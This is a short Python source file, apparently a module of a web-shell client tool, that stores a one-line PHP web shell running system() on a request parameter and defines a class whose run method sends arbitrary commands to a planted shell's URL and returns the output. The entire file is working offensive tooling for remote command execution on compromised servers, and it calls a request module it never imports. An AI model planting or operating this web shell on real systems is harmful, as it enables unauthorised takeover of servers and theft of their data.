from webshell.shellbase import  SystemShellBase

'''
<?php system($_{method}[{password}]);
'''

class Shell4(SystemShellBase):
    CONTENT = '''<?php system($_GET['cmd']);?>'''
    def __init__(self,url,method,password):
        self.url = url
        self.method = method
        self.password = password
    
    def run(self,code):
        return request.request(method=self.method,url=self.url,
                                data={self.password:code},params={self.password:code}).text